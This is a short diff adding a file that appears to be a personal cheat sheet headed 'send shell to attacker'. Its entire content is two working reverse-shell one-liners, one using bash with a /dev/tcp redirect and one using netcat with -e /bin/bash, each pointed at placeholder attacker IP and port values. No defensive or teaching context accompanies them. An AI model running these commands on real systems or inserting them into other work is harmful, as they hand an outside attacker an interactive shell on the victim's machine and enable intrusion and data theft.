@@ -1,0 +1,8 @@
+# dijey099
+# send shell to attacker
+
+# Bash
+bash -c 'bash -i >& /dev/tcp/<IP>/<port> 0>&1'
+
+# Netcat
+nc <IP> <port> -e /bin/bash
